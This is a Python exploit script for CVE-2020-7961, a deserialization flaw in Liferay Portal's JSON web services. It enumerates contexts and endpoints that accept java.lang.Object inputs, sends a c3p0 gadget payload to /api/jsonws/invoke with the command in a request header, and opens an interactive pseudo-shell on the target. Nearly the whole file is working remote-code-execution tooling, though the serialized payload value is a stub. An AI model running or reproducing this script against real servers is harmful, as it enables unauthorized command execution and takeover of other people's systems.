import argparse
import httpx
from bs4 import BeautifulSoup
import trio


'''TODO
- give option to recon or not
- add other exploitation methods: https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
- once vulnerable input are found, write a .log file with the vulnerable_elements array for that specific url to omit recon next time it's run
- and/or add --context and --endpoint arguments instead
'''


class Logger:
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet

    def debug(self, message):
        if self.verbosity == 2:
            print("{}[DEBUG]{} {}".format(YELLOW, END, message))

    def verbose(self, message):
        if self.verbosity >= 1:
            print("{}[VERBOSE]{} {}".format(BLUE, END, message))

    def info(self, message):
        if not self.quiet:
            print("{}[*]{} {}".format(BOLD_BLUE, END, message))

    def success(self, message):
        if not self.quiet:
            print("{}[+]{} {}".format(BOLD_GREEN, END, message))

    def warning(self, message):
        if not self.quiet:
            print("{}[-]{} {}".format(BOLD_ORANGE, END, message))

    def error(self, message):
        if not self.quiet:
            print("{}[!]{} {}".format(BOLD_RED, END, message))


def get_options():
    description = "Exploit script for CVE-2020-7961 (developed for unpatched 6.2 GA6, not tested on other versions"
    epilog = ""

    parser = argparse.ArgumentParser(
        description=description,
        epilog=epilog,
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument("-c", "--command", dest="command", action="store",
                        help="command to run on the target server", required=False)
    parser.add_argument("-t", "--target", dest="target", action="store",
                        help="target to attempt liferay RCE on", required=True)
    parser.add_argument("--api-path", dest="api_path", action="store",
                        help="target to attempt liferay RCE on", default="/api/jsonws")
    parser.add_argument("--max-children", dest="max_children", action="store", type=int,
                        help="Maximum children for async requests", default=5)
    parser.add_argument(
        "-v",
        "--verbose",
        dest="verbosity",
        action="count",
        default=0,
        help="verbosity level (-v for verbose, -vv for debug)",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        dest="quiet",
        action="store_true",
        default=False,
        help="show no information at all",
    )

    options = parser.parse_args()

    return options


def find_endpoints_in_context(target, api_path, context_path):
    logger.info(f"Enumerating endpoints for context \"{context_path}\"")
    r = httpx.get(url=target + api_path + "?contextPath=" + context_path)
    s = BeautifulSoup(r.text, "html.parser")
    nb_of_endpoints = len(s.find_all("a", href=True))
    logger.verbose(f"Parsing {nb_of_endpoints} endpoints")
    return s.find_all("a", {"class": "method-name lfr-api-service-result"}, href=True)


async def enumerate_endpoint_inputs(async_limiter, http_client, target, api_path, context_path, endpoint, vulnerable_elements):
    async with async_limiter:
        endpoint_name = endpoint["href"].split("signature=")[1]
        logger.verbose(f"Enumerating endpoint \"{endpoint_name}\"")
        try:
            r = await http_client.get(url=target + api_path + "?contextPath=" + context_path + "&signature=" + endpoint_name)
            s = BeautifulSoup(r.text, "html.parser")
            inputs = s.find_all("div", {"class": "input-append"})
            for input_specs in inputs:
                input_name = input_specs.input["name"]
                input_type = input_specs.span.get_text()
                if input_type == "java.lang.Object":
                    logger.success(f"Found hijackable input \"{input_name}\", in endpoint \"{endpoint_name}\", in context \"{context_path}\"")
                    vulnerable_elements.append({"context": context_path, "endpoint": endpoint_name})
        except httpx.ConnectTimeout:
            logger.warning(f"Timeout error when requesting endpoint \"{endpoint_name}\"")


def find_contexts(target, api_path):
    logger.verbose("Looking for context paths")
    r = httpx.get(url=target + api_path)
    s = BeautifulSoup(r.text, "html.parser")
    context_paths = []
    for context_path in s.find("select", id="contextPath").find_all("option"):
        context_paths.append(context_path["value"])
    logger.success(f"Found context paths: {context_paths}")
    return context_paths


def attack_invoke(target, api_path, vulnerable_elements, payload, payload_type, command):
    logger.info("Attacking method using the /api/jsonws/invoke")
    r = httpx.get(url=target + api_path + "/invoke")
    if "Unable to deserialize object" in r.text:
        logger.success("Target tries to deserialize objects")
        for vulnerable_element in vulnerable_elements:
            r = httpx.get(url=target + api_path + "?contextPath=" + vulnerable_element["context"] + "&signature=" + vulnerable_element["endpoint"])
            s = BeautifulSoup(r.text, 'html.parser')
            service_name = s.find("div", {"class": "lfr-api-method lfr-api-section"}).h2.string
            logger.info(f"Trying service named: {service_name}")
            params = {}
            inputs = s.find_all("div", {"class": "input-append"})
            for input_specs in inputs:
                input_name = input_specs.input["name"]
                input_type = input_specs.span.get_text()
                if input_type == "java.lang.Object":
                    params[input_name + ":" + payload_type] = payload
                else:
                    params[input_name] = "1"
            params["cmd"] = '{"' + service_name + '":{}}'

            result = attack_invoke_execute(target, api_path, params, command)
            if "exception" in result:
                logger.error("Command execution failed, trying next endpoint")
                logger.verbose(result)
            else:
                logger.success("Command execution success, output below:\n" + result)
                pseudo_shell = input("{}[?]{} Do you want a pseudo shell? [Y/n] ".format(BOLD_BLUE, END))
                if not pseudo_shell.lower() == "n":
                    attack_invoke_pseudo_shell(target, api_path, params)
                break
    else:
        logger.warning("Target does not try to deserialize objects, can't attack this way")


def attack_invoke_pseudo_shell(target, api_path, params):
    logger.info("Starting pseudo-shell\n")
    while True:
        cmd = input("{}>{} ".format(BOLD_RED, END))
        if cmd == "exit":
            break
        else:
            print(attack_invoke_execute(target, api_path, params, cmd))


def attack_invoke_execute(target, api_path, params, command):
    headers = {"cmd2": command}
    logger.verbose("Target: " + target + api_path + "/invoke")
    logger.verbose("Headers: " + str(headers))
    logger.verbose("Data: " + str(params))
    r = httpx.post(url=target + api_path + "/invoke", data=params, headers=headers)
    return r.text


async def main():
    logger.info(f"Starting CVE-2020-7961 exploitation on: {options.target}")
    logger.info("Looking for vulnerable endpoints")
    logger.info("Initiating contexts enumeration")
    context_paths = find_contexts(options.target, options.api_path)
    vulnerable_elements = []
    for context_path in context_paths:
        endpoints = find_endpoints_in_context(options.target, options.api_path, context_path)
        async with trio.open_nursery() as nursery:
            for endpoint in endpoints:
                nursery.start_soon(enumerate_endpoint_inputs, async_limiter, http_client, options.target, options.api_path, context_path, endpoint, vulnerable_elements)
    await http_client.aclose()
    logger.info("Moving on to exploitation attempts")
    if not options.command:
        options.command = input("{}[?]{} Command to run on target: ".format(BOLD_BLUE, END))

    payload_type = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    payload = '''{"userOverridesAsString":"HexAsciiSerializedMap}'''

    attack_invoke(options.target, options.api_path, vulnerable_elements, payload, payload_type, options.command)


if __name__ == "__main__":
    BOLD_GREEN = "\033[1;32m"
    BOLD_BLUE = "\033[1;34m"
    BOLD_WHITE = "\033[1;37m"
    BOLD_RED = "\033[1;31m"
    BOLD_ORANGE = "\033[1;93m"
    END = "\033[0m"
    BLUE = "\033[0;34m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    RED = "\033[0;31m"

    options = get_options()
    logger = Logger(options.verbosity, options.quiet)

    async_limiter = trio.CapacityLimiter(options.max_children)
    http_client = httpx.AsyncClient()

    trio.run(main)
